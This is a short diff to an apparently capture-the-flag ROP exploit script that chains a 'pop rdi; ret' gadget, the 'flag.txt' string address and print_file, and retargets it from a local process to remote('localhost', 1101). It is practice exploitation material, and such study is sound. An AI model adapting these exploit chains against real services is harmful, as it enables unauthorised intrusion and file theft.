@@ -18,7 +18,7 @@ payload += get_gadget(elf, ['pop rdi', 'ret'])
 payload += search_strings(elf, 'flag.txt')[0]
 payload += p64(elf.symbols.print_file)
 
-p = process("./challenge") # remote('localhost', 1101) #
+p = remote('localhost', 1101)
 
 p.sendline(payload)
 
